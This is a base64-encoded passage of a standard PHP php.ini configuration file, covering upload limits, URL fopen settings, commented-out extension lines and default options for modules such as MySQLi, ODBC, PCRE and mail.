RlIHNraXBzIHRoaXMgbGluZSBhbmQgaWdub3JlcyBpdHMgY29udGVudCBpZiB0aGlzIGRpcmVjdGl2ZSBpcyB0dXJuZWQgb24uCjsgaHR0cDovL3BocC5uZXQvY2dpLmNoZWNrLXNoZWJhbmctbGluZQo7Y2dpLmNoZWNrX3NoZWJhbmdfbGluZT0xCgo7Ozs7Ozs7Ozs7Ozs7Ozs7CjsgRmlsZSBVcGxvYWRzIDsKOzs7Ozs7Ozs7Ozs7Ozs7OwoKOyBXaGV0aGVyIHRvIGFsbG93IEhUVFAgZmlsZSB1cGxvYWRzLgo7IGh0dHA6Ly9waHAubmV0L2ZpbGUtdXBsb2FkcwpmaWxlX3VwbG9hZHMgPSBPbgoKOyBUZW1wb3JhcnkgZGlyZWN0b3J5IGZvciBIVFRQIHVwbG9hZGVkIGZpbGVzICh3aWxsIHVzZSBzeXN0ZW0gZGVmYXVsdCBpZiBub3QKOyBzcGVjaWZpZWQpLgo7IGh0dHA6Ly9waHAubmV0L3VwbG9hZC10bXAtZGlyCjt1cGxvYWRfdG1wX2RpciA9Cgo7IE1heGltdW0gYWxsb3dlZCBzaXplIGZvciB1cGxvYWRlZCBmaWxlcy4KOyBodHRwOi8vcGhwLm5ldC91cGxvYWQtbWF4LWZpbGVzaXplCnVwbG9hZF9tYXhfZmlsZXNpemUgPSAyTQoKOyBNYXhpbXVtIG51bWJlciBvZiBmaWxlcyB0aGF0IGNhbiBiZSB1cGxvYWRlZCB2aWEgYSBzaW5nbGUgcmVxdWVzdAptYXhfZmlsZV91cGxvYWRzID0gMjAKCjs7Ozs7Ozs7Ozs7Ozs7Ozs7Owo7IEZvcGVuIHdyYXBwZXJzIDsKOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Cgo7IFdoZXRoZXIgdG8gYWxsb3cgdGhlIHRyZWF0bWVudCBvZiBVUkxzIChsaWtlIGh0dHA6Ly8gb3IgZnRwOi8vKSBhcyBmaWxlcy4KOyBodHRwOi8vcGhwLm5ldC9hbGxvdy11cmwtZm9wZW4KYWxsb3dfdXJsX2ZvcGVuID0gT24KCjsgV2hldGhlciB0byBhbGxvdyBpbmNsdWRlL3JlcXVpcmUgdG8gb3BlbiBVUkxzIChsaWtlIGh0dHA6Ly8gb3IgZnRwOi8vKSBhcyBmaWxlcy4KOyBodHRwOi8vcGhwLm5ldC9hbGxvdy11cmwtaW5jbHVkZQphbGxvd191cmxfaW5jbHVkZSA9IE9mZgoKOyBEZWZpbmUgdGhlIGFub255bW91cyBmdHAgcGFzc3dvcmQgKHlvdXIgZW1haWwgYWRkcmVzcykuIFBIUCZhcG9zO3MgZGVmYXVsdCBzZXR0aW5nCjsgZm9yIHRoaXMgaXMgZW1wdHkuCjsgaHR0cDovL3BocC5uZXQvZnJvbQo7ZnJvbT0mcXVvdDtqb2huQGRvZS5jb20mcXVvdDsKCjsgRGVmaW5lIHRoZSBVc2VyLUFnZW50IHN0cmluZy4gUEhQJmFwb3M7cyBkZWZhdWx0IHNldHRpbmcgZm9yIHRoaXMgaXMgZW1wdHkuCjsgaHR0cDovL3BocC5uZXQvdXNlci1hZ2VudAo7dXNlcl9hZ2VudD0mcXVvdDtQSFAmcXVvdDsKCjsgRGVmYXVsdCB0aW1lb3V0IGZvciBzb2NrZXQgYmFzZWQgc3RyZWFtcyAoc2Vjb25kcykKOyBodHRwOi8vcGhwLm5ldC9kZWZhdWx0LXNvY2tldC10aW1lb3V0CmRlZmF1bHRfc29ja2V0X3RpbWVvdXQgPSA2MAoKOyBJZiB5b3VyIHNjcmlwdHMgaGF2ZSB0byBkZWFsIHdpdGggZmlsZXMgZnJvbSBNYWNpbnRvc2ggc3lzdGVtcywKOyBvciB5b3UgYXJlIHJ1bm5pbmcgb24gYSBNYWMgYW5kIG5lZWQgdG8gZGVhbCB3aXRoIGZpbGVzIGZyb20KOyB1bml4IG9yIHdpbjMyIHN5c3RlbXMsIHNldHRpbmcgdGhpcyBmbGFnIHdpbGwgY2F1c2UgUEhQIHRvCjsgYXV0b21hdGljYWxseSBkZXRlY3QgdGhlIEVPTCBjaGFyYWN0ZXIgaW4gdGhvc2UgZmlsZXMgc28gdGhhdAo7IGZnZXRzKCkgYW5kIGZpbGUoKSB3aWxsIHdvcmsgcmVnYXJkbGVzcyBvZiB0aGUgc291cmNlIG9mIHRoZSBmaWxlLgo7IGh0dHA6Ly9waHAubmV0L2F1dG8tZGV0ZWN0LWxpbmUtZW5kaW5ncwo7YXV0b19kZXRlY3RfbGluZV9lbmRpbmdzID0gT2ZmCgo7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7CjsgRHluYW1pYyBFeHRlbnNpb25zIDsKOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7OwoKOyBJZiB5b3Ugd2lzaCB0byBoYXZlIGFuIGV4dGVuc2lvbiBsb2FkZWQgYXV0b21hdGljYWxseSwgdXNlIHRoZSBmb2xsb3dpbmcKOyBzeW50YXg6CjsKOyAgIGV4dGVuc2lvbj1tb2R1bGVuYW1lCjsKOyBGb3IgZXhhbXBsZToKOwo7ICAgZXh0ZW5zaW9uPW15c3FsaQo7CjsgV2hlbiB0aGUgZXh0ZW5zaW9uIGxpYnJhcnkgdG8gbG9hZCBpcyBub3QgbG9jYXRlZCBpbiB0aGUgZGVmYXVsdCBleHRlbnNpb24KOyBkaXJlY3RvcnksIFlvdSBtYXkgc3BlY2lmeSBhbiBhYnNvbHV0ZSBwYXRoIHRvIHRoZSBsaWJyYXJ5IGZpbGU6CjsKOyAgIGV4dGVuc2lvbj0vcGF0aC90by9leHRlbnNpb24vbXlzcWxpLnNvCjsKOyBOb3RlIDogVGhlIHN5bnRheCB1c2VkIGluIHByZXZpb3VzIFBIUCB2ZXJzaW9ucyAoJmFwb3M7ZXh0ZW5zaW9uPSZsdDtleHQmZ3Q7LnNvJmFwb3M7IGFuZAo7ICZhcG9zO2V4dGVuc2lvbj0mYXBvcztwaHBfJmx0O2V4dCZndDsuZGxsJmFwb3M7KSBpcyBzdXBwb3J0ZWQgZm9yIGxlZ2FjeSByZWFzb25zIGFuZCBtYXkgYmUKOyBkZXByZWNhdGVkIGluIGEgZnV0dXJlIFBIUCBtYWpvciB2ZXJzaW9uLiBTbywgd2hlbiBpdCBpcyBwb3NzaWJsZSwgcGxlYXNlCjsgbW92ZSB0byB0aGUgbmV3ICgmYXBvcztleHRlbnNpb249Jmx0O2V4dCZndDspIHN5bnRheC4KOwo7IE5vdGVzIGZvciBXaW5kb3dzIGVudmlyb25tZW50cyA6CjsKOyAtIE1hbnkgRExMIGZpbGVzIGFyZSBsb2NhdGVkIGluIHRoZSBleHRlbnNpb25zLyAoUEhQIDQpIG9yIGV4dC8gKFBIUCA1KykKOyAgIGV4dGVuc2lvbiBmb2xkZXJzIGFzIHdlbGwgYXMgdGhlIHNlcGFyYXRlIFBFQ0wgRExMIGRvd25sb2FkIChQSFAgNSspLgo7ICAgQmUgc3VyZSB0byBhcHByb3ByaWF0ZWx5IHNldCB0aGUgZXh0ZW5zaW9uX2RpciBkaXJlY3RpdmUuCjsKO2V4dGVuc2lvbj1iejIKO2V4dGVuc2lvbj1jdXJsCjtleHRlbnNpb249ZmlsZWluZm8KO2V4dGVuc2lvbj1nZDIKO2V4dGVuc2lvbj1nZXR0ZXh0CjtleHRlbnNpb249Z21wCjtleHRlbnNpb249aW50bAo7ZXh0ZW5zaW9uPWltYXAKO2V4dGVuc2lvbj1pbnRlcmJhc2UKO2V4dGVuc2lvbj1sZGFwCjtleHRlbnNpb249bWJzdHJpbmcKO2V4dGVuc2lvbj1leGlmICAgICAgOyBNdXN0IGJlIGFmdGVyIG1ic3RyaW5nIGFzIGl0IGRlcGVuZHMgb24gaXQKO2V4dGVuc2lvbj1teXNxbGkKO2V4dGVuc2lvbj1vY2k4XzEyYyAgOyBVc2Ugd2l0aCBPcmFjbGUgRGF0YWJhc2UgMTJjIEluc3RhbnQgQ2xpZW50CjtleHRlbnNpb249b2RiYwo7ZXh0ZW5zaW9uPW9wZW5zc2wKO2V4dGVuc2lvbj1wZG9fZmlyZWJpcmQKO2V4dGVuc2lvbj1wZG9fbXlzcWwKO2V4dGVuc2lvbj1wZG9fb2NpCjtleHRlbnNpb249cGRvX29kYmMKO2V4dGVuc2lvbj1wZG9fcGdzcWwKO2V4dGVuc2lvbj1wZG9fc3FsaXRlCjtleHRlbnNpb249cGdzcWwKO2V4dGVuc2lvbj1zaG1vcAoKOyBUaGUgTUlCUyBkYXRhIGF2YWlsYWJsZSBpbiB0aGUgUEhQIGRpc3RyaWJ1dGlvbiBtdXN0IGJlIGluc3RhbGxlZC4KOyBTZWUgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9zbm1wLmluc3RhbGxhdGlvbi5waHAKO2V4dGVuc2lvbj1zbm1wCgo7ZXh0ZW5zaW9uPXNvYXAKO2V4dGVuc2lvbj1zb2NrZXRzCjtleHRlbnNpb249c29kaXVtCjtleHRlbnNpb249c3FsaXRlMwo7ZXh0ZW5zaW9uPXRpZHkKO2V4dGVuc2lvbj14bWxycGMKO2V4dGVuc2lvbj14c2wKCjs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBNb2R1bGUgU2V0dGluZ3MgOwo7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7CgpbQ0xJIFNlcnZlcl0KOyBXaGV0aGVyIHRoZSBDTEkgd2ViIHNlcnZlciB1c2VzIEFOU0kgY29sb3IgY29kaW5nIGluIGl0cyB0ZXJtaW5hbCBvdXRwdXQuCmNsaV9zZXJ2ZXIuY29sb3IgPSBPbgoKW0RhdGVdCjsgRGVmaW5lcyB0aGUgZGVmYXVsdCB0aW1lem9uZSB1c2VkIGJ5IHRoZSBkYXRlIGZ1bmN0aW9ucwo7IGh0dHA6Ly9waHAubmV0L2RhdGUudGltZXpvbmUKO2RhdGUudGltZXpvbmUgPQoKOyBodHRwOi8vcGhwLm5ldC9kYXRlLmRlZmF1bHQtbGF0aXR1ZGUKO2RhdGUuZGVmYXVsdF9sYXRpdHVkZSA9IDMxLjc2NjcKCjsgaHR0cDovL3BocC5uZXQvZGF0ZS5kZWZhdWx0LWxvbmdpdHVkZQo7ZGF0ZS5kZWZhdWx0X2xvbmdpdHVkZSA9IDM1LjIzMzMKCjsgaHR0cDovL3BocC5uZXQvZGF0ZS5zdW5yaXNlLXplbml0aAo7ZGF0ZS5zdW5yaXNlX3plbml0aCA9IDkwLjU4MzMzMwoKOyBodHRwOi8vcGhwLm5ldC9kYXRlLnN1bnNldC16ZW5pdGgKO2RhdGUuc3Vuc2V0X3plbml0aCA9IDkwLjU4MzMzMwoKW2ZpbHRlcl0KOyBodHRwOi8vcGhwLm5ldC9maWx0ZXIuZGVmYXVsdAo7ZmlsdGVyLmRlZmF1bHQgPSB1bnNhZmVfcmF3Cgo7IGh0dHA6Ly9waHAubmV0L2ZpbHRlci5kZWZhdWx0LWZsYWdzCjtmaWx0ZXIuZGVmYXVsdF9mbGFncyA9CgpbaWNvbnZdCjsgVXNlIG9mIHRoaXMgSU5JIGVudHJ5IGlzIGRlcHJlY2F0ZWQsIHVzZSBnbG9iYWwgaW5wdXRfZW5jb2RpbmcgaW5zdGVhZC4KOyBJZiBlbXB0eSwgZGVmYXVsdF9jaGFyc2V0IG9yIGlucHV0X2VuY29kaW5nIG9yIGljb252LmlucHV0X2VuY29kaW5nIGlzIHVzZWQuCjsgVGhlIHByZWNlZGVuY2UgaXM6IGRlZmF1bHRfY2hhcnNldCAmbHQ7IGlucHV0X2VuY29kaW5nICZsdDsgaWNvbnYuaW5wdXRfZW5jb2RpbmcKO2ljb252LmlucHV0X2VuY29kaW5nID0KCjsgVXNlIG9mIHRoaXMgSU5JIGVudHJ5IGlzIGRlcHJlY2F0ZWQsIHVzZSBnbG9iYWwgaW50ZXJuYWxfZW5jb2RpbmcgaW5zdGVhZC4KOyBJZiBlbXB0eSwgZGVmYXVsdF9jaGFyc2V0IG9yIGludGVybmFsX2VuY29kaW5nIG9yIGljb252LmludGVybmFsX2VuY29kaW5nIGlzIHVzZWQuCjsgVGhlIHByZWNlZGVuY2UgaXM6IGRlZmF1bHRfY2hhcnNldCAmbHQ7IGludGVybmFsX2VuY29kaW5nICZsdDsgaWNvbnYuaW50ZXJuYWxfZW5jb2RpbmcKO2ljb252LmludGVybmFsX2VuY29kaW5nID0KCjsgVXNlIG9mIHRoaXMgSU5JIGVudHJ5IGlzIGRlcHJlY2F0ZWQsIHVzZSBnbG9iYWwgb3V0cHV0X2VuY29kaW5nIGluc3RlYWQuCjsgSWYgZW1wdHksIGRlZmF1bHRfY2hhcnNldCBvciBvdXRwdXRfZW5jb2Rpbmcgb3IgaWNvbnYub3V0cHV0X2VuY29kaW5nIGlzIHVzZWQuCjsgVGhlIHByZWNlZGVuY2UgaXM6IGRlZmF1bHRfY2hhcnNldCAmbHQ7IG91dHB1dF9lbmNvZGluZyAmbHQ7IGljb252Lm91dHB1dF9lbmNvZGluZwo7IFRvIHVzZSBhbiBvdXRwdXQgZW5jb2RpbmcgY29udmVyc2lvbiwgaWNvbnYmYXBvcztzIG91dHB1dCBoYW5kbGVyIG11c3QgYmUgc2V0Cjsgb3RoZXJ3aXNlIG91dHB1dCBlbmNvZGluZyBjb252ZXJzaW9uIGNhbm5vdCBiZSBwZXJmb3JtZWQuCjtpY29udi5vdXRwdXRfZW5jb2RpbmcgPQoKW2ltYXBdCjsgcnNoL3NzaCBsb2dpbnMgYXJlIGRpc2FibGVkIGJ5IGRlZmF1bHQuIFVzZSB0aGlzIElOSSBlbnRyeSBpZiB5b3Ugd2FudCB0bwo7IGVuYWJsZSB0aGVtLiBOb3RlIHRoYXQgdGhlIElNQVAgbGlicmFyeSBkb2VzIG5vdCBmaWx0ZXIgbWFpbGJveCBuYW1lcyBiZWZvcmUKOyBwYXNzaW5nIHRoZW0gdG8gcnNoL3NzaCBjb21tYW5kLCB0aHVzIHBhc3NpbmcgdW50cnVzdGVkIGRhdGEgdG8gdGhpcyBmdW5jdGlvbgo7IHdpdGggcnNoL3NzaCBlbmFibGVkIGlzIGluc2VjdXJlLgo7aW1hcC5lbmFibGVfaW5zZWN1cmVfcnNoPTAKCltpbnRsXQo7aW50bC5kZWZhdWx0X2xvY2FsZSA9CjsgVGhpcyBkaXJlY3RpdmUgYWxsb3dzIHlvdSB0byBwcm9kdWNlIFBIUCBlcnJvcnMgd2hlbiBzb21lIGVycm9yCjsgaGFwcGVucyB3aXRoaW4gaW50bCBmdW5jdGlvbnMuIFRoZSB2YWx1ZSBpcyB0aGUgbGV2ZWwgb2YgdGhlIGVycm9yIHByb2R1Y2VkLgo7IERlZmF1bHQgaXMgMCwgd2hpY2ggZG9lcyBub3QgcHJvZHVjZSBhbnkgZXJyb3JzLgo7aW50bC5lcnJvcl9sZXZlbCA9IEVfV0FSTklORwo7aW50bC51c2VfZXhjZXB0aW9ucyA9IDAKCltzcWxpdGUzXQo7IERpcmVjdG9yeSBwb2ludGluZyB0byBTUUxpdGUzIGV4dGVuc2lvbnMKOyBodHRwOi8vcGhwLm5ldC9zcWxpdGUzLmV4dGVuc2lvbi1kaXIKO3NxbGl0ZTMuZXh0ZW5zaW9uX2RpciA9Cgo7IFNRTGl0ZSBkZWZlbnNpdmUgbW9kZSBmbGFnIChvbmx5IGF2YWlsYWJsZSBmcm9tIFNRTGl0ZSAzLjI2KykKOyBXaGVuIHRoZSBkZWZlbnNpdmUgZmxhZyBpcyBlbmFibGVkLCBsYW5ndWFnZSBmZWF0dXJlcyB0aGF0IGFsbG93IG9yZGluYXJ5CjsgU1FMIHRvIGRlbGliZXJhdGVseSBjb3JydXB0IHRoZSBkYXRhYmFzZSBmaWxlIGFyZSBkaXNhYmxlZC4gVGhpcyBmb3JiaWRzCjsgd3JpdGluZyBkaXJlY3RseSB0byB0aGUgc2NoZW1hLCBzaGFkb3cgdGFibGVzIChlZy4gRlRTIGRhdGEgdGFibGVzKSwgb3IKOyB0aGUgc3FsaXRlX2RicGFnZSB2aXJ0dWFsIHRhYmxlLgo7IGh0dHBzOi8vd3d3LnNxbGl0ZS5vcmcvYzNyZWYvY19kYmNvbmZpZ19kZWZlbnNpdmUuaHRtbAo7IChmb3Igb2xkZXIgU1FMaXRlIHZlcnNpb25zLCB0aGlzIGZsYWcgaGFzIG5vIHVzZSkKO3NxbGl0ZTMuZGVmZW5zaXZlID0gMQoKW1BjcmVdCjsgUENSRSBsaWJyYXJ5IGJhY2t0cmFja2luZyBsaW1pdC4KOyBodHRwOi8vcGhwLm5ldC9wY3JlLmJhY2t0cmFjay1saW1pdAo7cGNyZS5iYWNrdHJhY2tfbGltaXQ9MTAwMDAwCgo7IFBDUkUgbGlicmFyeSByZWN1cnNpb24gbGltaXQuCjsgUGxlYXNlIG5vdGUgdGhhdCBpZiB5b3Ugc2V0IHRoaXMgdmFsdWUgdG8gYSBoaWdoIG51bWJlciB5b3UgbWF5IGNvbnN1bWUgYWxsCjsgdGhlIGF2YWlsYWJsZSBwcm9jZXNzIHN0YWNrIGFuZCBldmVudHVhbGx5IGNyYXNoIFBIUCAoZHVlIHRvIHJlYWNoaW5nIHRoZQo7IHN0YWNrIHNpemUgbGltaXQgaW1wb3NlZCBieSB0aGUgT3BlcmF0aW5nIFN5c3RlbSkuCjsgaHR0cDovL3BocC5uZXQvcGNyZS5yZWN1cnNpb24tbGltaXQKO3BjcmUucmVjdXJzaW9uX2xpbWl0PTEwMDAwMAoKOyBFbmFibGVzIG9yIGRpc2FibGVzIEpJVCBjb21waWxhdGlvbiBvZiBwYXR0ZXJucy4gVGhpcyByZXF1aXJlcyB0aGUgUENSRQo7IGxpYnJhcnkgdG8gYmUgY29tcGlsZWQgd2l0aCBKSVQgc3VwcG9ydC4KO3BjcmUuaml0PTEKCltQZG9dCjsgV2hldGhlciB0byBwb29sIE9EQkMgY29ubmVjdGlvbnMuIENhbiBiZSBvbmUgb2YgJnF1b3Q7c3RyaWN0JnF1b3Q7LCAmcXVvdDtyZWxheGVkJnF1b3Q7IG9yICZxdW90O29mZiZxdW90Owo7IGh0dHA6Ly9waHAubmV0L3Bkby1vZGJjLmNvbm5lY3Rpb24tcG9vbGluZwo7cGRvX29kYmMuY29ubmVjdGlvbl9wb29saW5nPXN0cmljdAoKO3Bkb19vZGJjLmRiMl9pbnN0YW5jZV9uYW1lCgpbUGRvX215c3FsXQo7IERlZmF1bHQgc29ja2V0IG5hbWUgZm9yIGxvY2FsIE15U1FMIGNvbm5lY3RzLiAgSWYgZW1wdHksIHVzZXMgdGhlIGJ1aWx0LWluCjsgTXlTUUwgZGVmYXVsdHMuCnBkb19teXNxbC5kZWZhdWx0X3NvY2tldD0KCltQaGFyXQo7IGh0dHA6Ly9waHAubmV0L3BoYXIucmVhZG9ubHkKO3BoYXIucmVhZG9ubHkgPSBPbgoKOyBodHRwOi8vcGhwLm5ldC9waGFyLnJlcXVpcmUtaGFzaAo7cGhhci5yZXF1aXJlX2hhc2ggPSBPbgoKO3BoYXIuY2FjaGVfbGlzdCA9CgpbbWFpbCBmdW5jdGlvbl0KOyBGb3IgV2luMzIgb25seS4KOyBodHRwOi8vcGhwLm5ldC9zbXRwClNNVFAgPSBsb2NhbGhvc3QKOyBodHRwOi8vcGhwLm5ldC9zbXRwLXBvcnQKc210cF9wb3J0ID0gMjUKCjsgRm9yIFdpbjMyIG9ubHkuCjsgaHR0cDovL3BocC5uZXQvc2VuZG1haWwtZnJvbQo7c2VuZG1haWxfZnJvbSA9IG1lQGV4YW1wbGUuY29tCgo7IEZvciBVbml4IG9ubHkuICBZb3UgbWF5IHN1cHBseSBhcmd1bWVudHMgYXMgd2VsbCAoZGVmYXVsdDogJnF1b3Q7c2VuZG1haWwgLXQgLWkmcXVvdDspLgo7IGh0dHA6Ly9waHAubmV0L3NlbmRtYWlsLXBhdGgKO3NlbmRtYWlsX3BhdGggPQoKOyBGb3JjZSB0aGUgYWRkaXRpb24gb2YgdGhlIHNwZWNpZmllZCBwYXJhbWV0ZXJzIHRvIGJlIHBhc3NlZCBhcyBleHRyYSBwYXJhbWV0ZXJzCjsgdG8gdGhlIHNlbmRtYWlsIGJpbmFyeS4gVGhlc2UgcGFyYW1ldGVycyB3aWxsIGFsd2F5cyByZXBsYWNlIHRoZSB2YWx1ZSBvZgo7IHRoZSA1dGggcGFyYW1ldGVyIHRvIG1haWwoKS4KO21haWwuZm9yY2VfZXh0cmFfcGFyYW1ldGVycyA9Cgo7IEFkZCBYLVBIUC1PcmlnaW5hdGluZy1TY3JpcHQ6IHRoYXQgd2lsbCBpbmNsdWRlIHVpZCBvZiB0aGUgc2NyaXB0IGZvbGxvd2VkIGJ5IHRoZSBmaWxlbmFtZQptYWlsLmFkZF94X2hlYWRlciA9IE9mZgoKOyBUaGUgcGF0aCB0byBhIGxvZyBmaWxlIHRoYXQgd2lsbCBsb2cgYWxsIG1haWwoKSBjYWxscy4gTG9nIGVudHJpZXMgaW5jbHVkZQo7IHRoZSBmdWxsIHBhdGggb2YgdGhlIHNjcmlwdCwgbGluZSBudW1iZXIsIFRvIGFkZHJlc3MgYW5kIGhlYWRlcnMuCjttYWlsLmxvZyA9CjsgTG9nIG1haWwgdG8gc3lzbG9nIChFdmVudCBMb2cgb24gV2luZG93cykuCjttYWlsLmxvZyA9IHN5c2xvZwoKW09EQkNdCjsgaHR0cDovL3BocC5uZXQvb2RiYy5kZWZhdWx0LWRiCjtvZGJjLmRlZmF1bHRfZGIgICAgPSAgTm90IHlldCBpbXBsZW1lbnRlZAoKOyBodHRwOi8vcGhwLm5ldC9vZGJjLmRlZmF1bHQtdXNlcgo7b2RiYy5kZWZhdWx0X3VzZXIgID0gIE5vdCB5ZXQgaW1wbGVtZW50ZWQKCjsgaHR0cDovL3BocC5uZXQvb2RiYy5kZWZhdWx0LXB3CjtvZGJjLmRlZmF1bHRfcHcgICAgPSAgTm90IHlldCBpbXBsZW1lbnRlZAoKOyBDb250cm9scyB0aGUgT0RCQyBjdXJzb3IgbW9kZWwuCjsgRGVmYXVsdDogU1FMX0NVUlNPUl9TVEFUSUMgKGRlZmF1bHQpLgo7b2RiYy5kZWZhdWx0X2N1cnNvcnR5cGUKCjsgQWxsb3cgb3IgcHJldmVudCBwZXJzaXN0ZW50IGxpbmtzLgo7IGh0dHA6Ly9waHAubmV0L29kYmMuYWxsb3ctcGVyc2lzdGVudApvZGJjLmFsbG93X3BlcnNpc3RlbnQgPSBPbgoKOyBDaGVjayB0aGF0IGEgY29ubmVjdGlvbiBpcyBzdGlsbCB2YWxpZCBiZWZvcmUgcmV1c2UuCjsgaHR0cDovL3BocC5uZXQvb2RiYy5jaGVjay1wZXJzaXN0ZW50Cm9kYmMuY2hlY2tfcGVyc2lzdGVudCA9IE9uCgo7IE1heGltdW0gbnVtYmVyIG9mIHBlcnNpc3RlbnQgbGlua3MuICAtMSBtZWFucyBubyBsaW1pdC4KOyBodHRwOi8vcGhwLm5ldC9vZGJjLm1heC1wZXJzaXN0ZW50Cm9kYmMubWF4X3BlcnNpc3RlbnQgPSAtMQoKOyBNYXhpbXVtIG51bWJlciBvZiBsaW5rcyAocGVyc2lzdGVudCArIG5vbi1wZXJzaXN0ZW50KS4gIC0xIG1lYW5zIG5vIGxpbWl0Lgo7IGh0dHA6Ly9waHAubmV0L29kYmMubWF4LWxpbmtzCm9kYmMubWF4X2xpbmtzID0gLTEKCjsgSGFuZGxpbmcgb2YgTE9ORyBmaWVsZHMuICBSZXR1cm5zIG51bWJlciBvZiBieXRlcyB0byB2YXJpYWJsZXMuICAwIG1lYW5zCjsgcGFzc3RocnUuCjsgaHR0cDovL3BocC5uZXQvb2RiYy5kZWZhdWx0bHJsCm9kYmMuZGVmYXVsdGxybCA9IDQwOTYKCjsgSGFuZGxpbmcgb2YgYmluYXJ5IGRhdGEuICAwIG1lYW5zIHBhc3N0aHJ1LCAxIHJldHVybiBhcyBpcywgMiBjb252ZXJ0IHRvIGNoYXIuCjsgU2VlIHRoZSBkb2N1bWVudGF0aW9uIG9uIG9kYmNfYmlubW9kZSBhbmQgb2RiY19sb25ncmVhZGxlbiBmb3IgYW4gZXhwbGFuYXRpb24KOyBvZiBvZGJjLmRlZmF1bHRscmwgYW5kIG9kYmMuZGVmYXVsdGJpbm1vZGUKOyBodHRwOi8vcGhwLm5ldC9vZGJjLmRlZmF1bHRiaW5tb2RlCm9kYmMuZGVmYXVsdGJpbm1vZGUgPSAxCgpbSW50ZXJiYXNlXQo7IEFsbG93IG9yIHByZXZlbnQgcGVyc2lzdGVudCBsaW5rcy4KaWJhc2UuYWxsb3dfcGVyc2lzdGVudCA9IDEKCjsgTWF4aW11bSBudW1iZXIgb2YgcGVyc2lzdGVudCBsaW5rcy4gIC0xIG1lYW5zIG5vIGxpbWl0LgppYmFzZS5tYXhfcGVyc2lzdGVudCA9IC0xCgo7IE1heGltdW0gbnVtYmVyIG9mIGxpbmtzIChwZXJzaXN0ZW50ICsgbm9uLXBlcnNpc3RlbnQpLiAgLTEgbWVhbnMgbm8gbGltaXQuCmliYXNlLm1heF9saW5rcyA9IC0xCgo7IERlZmF1bHQgZGF0YWJhc2UgbmFtZSBmb3IgaWJhc2VfY29ubmVjdCgpLgo7aWJhc2UuZGVmYXVsdF9kYiA9Cgo7IERlZmF1bHQgdXNlcm5hbWUgZm9yIGliYXNlX2Nvbm5lY3QoKS4KO2liYXNlLmRlZmF1bHRfdXNlciA9Cgo7IERlZmF1bHQgcGFzc3dvcmQgZm9yIGliYXNlX2Nvbm5lY3QoKS4KO2liYXNlLmRlZmF1bHRfcGFzc3dvcmQgPQoKOyBEZWZhdWx0IGNoYXJzZXQgZm9yIGliYXNlX2Nvbm5lY3QoKS4KO2liYXNlLmRlZmF1bHRfY2hhcnNldCA9Cgo7IERlZmF1bHQgdGltZXN0YW1wIGZvcm1hdC4KaWJhc2UudGltZXN0YW1wZm9ybWF0ID0gJnF1b3Q7JVktJW0tJWQgJUg6JU06JVMmcXVvdDsKCjsgRGVmYXVsdCBkYXRlIGZvcm1hdC4KaWJhc2UuZGF0ZWZvcm1hdCA9ICZxdW90OyVZLSVtLSVkJnF1b3Q7Cgo7IERlZmF1bHQgdGltZSBmb3JtYXQuCmliYXNlLnRpbWVmb3JtYXQgPSAmcXVvdDslSDolTTolUyZxdW90OwoKW015U1FMaV0KCjsgTWF4aW11bSBudW1iZXIgb2YgcGVyc2lzdGVudCBsaW5rcy4gIC0xIG1lYW5zIG5vIGxpbWl0Lgo7IGh0dHA6Ly9waHAubmV0L215c3FsaS5tYXgtcGVyc2lzdGVudApteXNxbGkubWF4X3BlcnNpc3RlbnQgPSAtMQoKOyBBbGxvdyBhY2Nlc3NpbmcsIGZyb20gUEhQJmFwb3M7cyBwZXJzcGVjdGl2ZSwgbG9jYWwgZmlsZXMgd2l0aCBMT0FEIERBVEEgc3RhdGVtZW50cwo7IGh0dHA6Ly9waHAubmV0L215c3FsaS5hbGxvd19sb2NhbF9pbmZpbGUKbXlzcWxpLmFsbG93X2xvY2FsX2luZmlsZSA9IE9uCgo7IEFsbG93IG9yIHByZXZlbnQgcGVyc2lzdGVudCBsaW5rcy4KOyBodHRwOi8vcGhwLm5ldC9teXNxbGkuYWxsb3ctcGVyc2lzdGVudApteXNxbGkuYWxsb3dfcGVyc2lzdGVudCA9IE9uCgo7IE1heGltdW0gbnVtYmVyIG9mIGxpbmtzLiAgLTEgbWVhbnMgbm8gbGltaXQuCjsgaHR0cDovL3BocC5uZXQvbXlzcWxpLm1heC1saW5rcwpteXNxbGkubWF4X2xpbmtzID0gLTEKCjsgRGVmYXVsdCBwb3J0IG51bWJlciBmb3IgbXlzcWxpX2Nvbm5lY3QoKS4gIElmIHVuc2V0LCBteXNxbGlfY29ubmVjdCgpIHdpbGwgdXNlCjsgdGhlICRNWVNRTF9UQ1BfUE9SVCBvciB0aGUgbXlzcWwtdGNwIGVudHJ5IGluIC9ldGMvc2VydmljZXMgb3IgdGhlCjsgY29tcGlsZS10aW1lIHZhbHVlIGRlZmluZWQgTVlTUUxfUE9SVCAoaW4gdGhhdCBvcmRlcikuICBXaW4zMiB3aWxsIG9ubHkgbG9vawo7IGF0IE1ZU1FMX1BPUlQuCjsgaHR0cDovL3BocC5uZXQvbXlzcWxpLmRlZmF1bHQtcG9ydApteXNxbGkuZGVmYXVsdF9wb3J0ID0gMzMwNgoKOyBEZWZhdWx0IHNvY2tldCBuYW1lIGZvciBsb2NhbCBNeVNRTCBjb25uZWN0cy4gIElmIGVtcHR5LCB1c2VzIHRoZSBidWlsdC1pbgo7IE15U1FMIGRlZmF1bHRzLgo7IGh0dHA6Ly9waHAubmV0L215c3FsaS5kZWZhdWx0LXNvY2tldApteXNxbGkuZGVmYXVsdF9zb2NrZXQgPQoKOyBEZWZhdWx0IGhvc3QgZm9yIG15c3FsX2Nvbm5lY3QoKSAoZG9lc24mYXBvczt0IGFwcGx5IGluIHNhZmUgbW9kZSkuCjsgaHR0cDovL3BocC5uZXQvbXlzcWxpLmRlZmF1bHQtaG9zdApteXNxbGkuZGVmYXVsdF9ob3N0ID0KCjsgRGVmYXVsdCB1c2VyIGZvciBteXNxbF9jb25uZWN0KCkgKGRvZXNuJmFwb3M7dCBhcHBseSBpbiBzYWZlIG1vZGUpLgo7IGh0dHA6Ly9waHAubmV0L215c3FsaS5kZWZhdWx0LXVzZXIKbXlzcWxpLmRlZmF1bHRfdXNlciA9Cgo7IERlZmF1bHQgcGFzc3dvcmQgZm9yIG15c3FsaV9jb25uZWN0KCkgKGRvZXNuJmFwb3M7dCBhcHBseSBpbiBzYWZlIG1vZGUpLgo7IE5vdGUgdGhhdCB0aGlzIGlzIGd